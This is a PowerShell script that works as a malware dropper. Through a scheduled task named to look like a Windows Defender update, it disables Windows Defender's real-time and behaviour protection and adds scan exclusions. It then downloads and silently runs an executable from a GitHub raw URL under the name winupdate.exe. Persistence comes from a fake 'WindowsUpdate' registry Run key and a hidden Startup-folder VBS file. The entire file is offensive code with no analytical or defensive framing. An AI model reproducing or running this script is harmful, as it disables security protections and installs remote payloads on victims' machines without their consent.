# Focus exclusively on disabling protection with proper elevation
$logPath = "$env:TEMP\disable_log.txt"
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "$env:TEMP\winupdate.exe"

# Start logging
"$(Get-Date) - Starting protection disable script" | Out-File $logPath

# Create a script that will run with elevated privileges through a scheduled task
$elevatedScriptPath = "$env:TEMP\disable_protection.ps1"

$elevatedScriptContent = @"
# Logging
`$logPath = "$logPath"
"``$(Get-Date) - Starting elevated script" | Out-File -FilePath `$logPath -Append

# Try multiple methods to disable protection
try {
    # Method 1: Disable real-time monitoring
    "``$(Get-Date) - Trying method 1: Disable real-time monitoring" | Out-File -FilePath `$logPath -Append
    Set-MpPreference -DisableRealtimeMonitoring `$true -Force
    `$status = Get-MpComputerStatus
    "``$(Get-Date) - Real-time monitoring status: `$(`$status.RealTimeProtectionEnabled)" | Out-File -FilePath `$logPath -Append
    
    # Method 2: Disable all components
    "``$(Get-Date) - Trying method 2: Disable all components" | Out-File -FilePath `$logPath -Append
    Set-MpPreference -DisableRealtimeMonitoring `$true -DisableIOAVProtection `$true -DisableBehaviorMonitoring `$true -DisableBlockAtFirstSeen `$true -DisableIntrusionPreventionSystem `$true -DisableScriptScanning `$true -Force
    "``$(Get-Date) - All components disabled" | Out-File -FilePath `$logPath -Append
    
    # Method 3: Add exclusion for temp folder
    "``$(Get-Date) - Trying method 3: Add exclusion for temp folder" | Out-File -FilePath `$logPath -Append
    Add-MpPreference -ExclusionPath `$env:TEMP -Force
    "``$(Get-Date) - Added temp folder exclusion" | Out-File -FilePath `$logPath -Append
    
    # Method 4: Add exclusion for specific file
    "``$(Get-Date) - Trying method 4: Add specific file exclusion" | Out-File -FilePath `$logPath -Append
    Add-MpPreference -ExclusionPath "$downloadPath" -Force
    "``$(Get-Date) - Added specific file exclusion" | Out-File -FilePath `$logPath -Append
    
    # Method 5: Add process exclusion
    "``$(Get-Date) - Trying method 5: Add process exclusion" | Out-File -FilePath `$logPath -Append
    Add-MpPreference -ExclusionProcess "$downloadPath" -Force
    "``$(Get-Date) - Added process exclusion" | Out-File -FilePath `$logPath -Append
    
    # Get current exclusions to verify
    `$exclusions = Get-MpPreference | Select-Object ExclusionPath, ExclusionProcess
    "``$(Get-Date) - Current exclusions: `$(`$exclusions | Out-String)" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Error disabling protection: `$_" | Out-File -FilePath `$logPath -Append
}

# Try to download and run the file
try {
    # Download the file
    "``$(Get-Date) - Downloading file" | Out-File -FilePath `$logPath -Append
    (New-Object Net.WebClient).DownloadFile("$downloadUrl", "$downloadPath")
    
    if (Test-Path "$downloadPath") {
        "``$(Get-Date) - Download successful" | Out-File -FilePath `$logPath -Append
        
        # Try to launch
        "``$(Get-Date) - Attempting to run file" | Out-File -FilePath `$logPath -Append
        try {
            Start-Process -FilePath "$downloadPath" -ArgumentList "/silent"
            "``$(Get-Date) - Process started successfully" | Out-File -FilePath `$logPath -Append
        } catch {
            "``$(Get-Date) - Failed to start process: `$_" | Out-File -FilePath `$logPath -Append
        }
    } else {
        "``$(Get-Date) - File download appeared to succeed but file not found" | Out-File -FilePath `$logPath -Append
    }
} catch {
    "``$(Get-Date) - Error in download/execute phase: `$_" | Out-File -FilePath `$logPath -Append
}

# Create startup entries for persistence
try {
    "``$(Get-Date) - Creating startup entries" | Out-File -FilePath `$logPath -Append
    
    # Registry startup
    Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "WindowsUpdate" -Value "`"$downloadPath`" /silent" -Force
    
    # Startup folder
    `$startupFolder = "`$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    `$vbsPath = "`$startupFolder\\update.vbs"
    
    `$vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -WindowStyle Hidden -Command \\"Set-MpPreference -DisableRealtimeMonitoring `$true -Force; Start-Sleep -Seconds 2; Start-Process -FilePath '$downloadPath' -ArgumentList '/silent'\\""", 0, False
"@
    
    `$vbsContent | Out-File -FilePath `$vbsPath -Encoding ASCII
    "``$(Get-Date) - Created startup entries" | Out-File -FilePath `$logPath -Append
} catch {
    "``$(Get-Date) - Failed to create startup entries: `$_" | Out-File -FilePath `$logPath -Append
}

"``$(Get-Date) - Elevated script completed" | Out-File -FilePath `$logPath -Append
"@

# Write the elevated script to a file
$elevatedScriptContent | Out-File -FilePath $elevatedScriptPath -Encoding UTF8
"$(Get-Date) - Created elevated script at: $elevatedScriptPath" | Out-File $logPath -Append

# Create a scheduled task to run the script with highest privileges
try {
    "$(Get-Date) - Creating scheduled task" | Out-File $logPath -Append
    
    # Task properties
    $taskName = "WindowsDefenderUpdate_$(Get-Random)"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$elevatedScriptPath`""
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)
    $principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    # Register the task
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
    "$(Get-Date) - Scheduled task created: $taskName" | Out-File $logPath -Append
    
    # Also try to run it immediately if possible
    "$(Get-Date) - Attempting to start task immediately" | Out-File $logPath -Append
    Start-ScheduledTask -TaskName $taskName
    "$(Get-Date) - Task start triggered" | Out-File $logPath -Append
} catch {
    "$(Get-Date) - Error creating scheduled task: $_" | Out-File $logPath -Append
}

# As a final fallback, download the file now if we can
try {
    "$(Get-Date) - Fallback: Downloading file directly" | Out-File $logPath -Append
    (New-Object Net.WebClient).DownloadFile($downloadUrl, $downloadPath)
    "$(Get-Date) - Fallback download completed" | Out-File $logPath -Append
} catch {
    "$(Get-Date) - Fallback download failed: $_" | Out-File $logPath -Append
}

"$(Get-Date) - Script completed. Elevated task will run soon to disable protection." | Out-File $logPath -Append